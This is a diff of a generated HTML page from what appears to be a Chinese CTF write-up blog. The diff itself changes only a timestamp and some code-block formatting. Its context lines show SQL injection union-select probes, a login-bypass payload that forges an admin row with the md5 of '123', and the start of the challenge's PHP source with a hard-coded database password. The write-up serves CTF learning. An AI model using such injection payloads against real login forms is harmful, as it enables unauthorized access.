@@ -18,7 +18,7 @@
 <meta property="og:image" content="https://yd0ng.github.io/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/2.png">
 <meta property="og:image" content="https://yd0ng.github.io/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/3.png">
 <meta property="article:published_time" content="2020-02-04T06:19:53.000Z">
-<meta property="article:modified_time" content="2020-02-04T12:44:32.364Z">
+<meta property="article:modified_time" content="2020-02-04T12:46:06.108Z">
 <meta property="article:author" content="yd0ng">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -189,7 +189,7 @@
 <p>测字段数</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,2,3#</span><br><span class="line">admin&#39; union select 1,2,3,4#</span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line">对比差异可以判断字段数为3</span><br><span class="line">因为密码是做了md5,所以可以构造联合查询来伪造出密码，最终payload 如下</span><br></pre></td></tr></table></figure>
 <p>name=’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’#&amp;pw=123</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* 说明：202cb962ac59075b964b07152d234b70&#x3D;md5(123)</span><br><span class="line"></span><br><span class="line">得到flag</span><br><span class="line"></span><br><span class="line">### 代码参考</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 说明：202cb962ac59075b964b07152d234b70&#x3D;md5(123)</span><br><span class="line"></span><br><span class="line">得到flag</span><br><span class="line"></span><br><span class="line">### 代码参考</span><br></pre></td></tr></table></figure>
 <?php
 if($_POST["user"] && $_POST["pass"]) {
     $mysqli = new mysqli("localhost", "root", "2wsx3edctf", "challenges");  
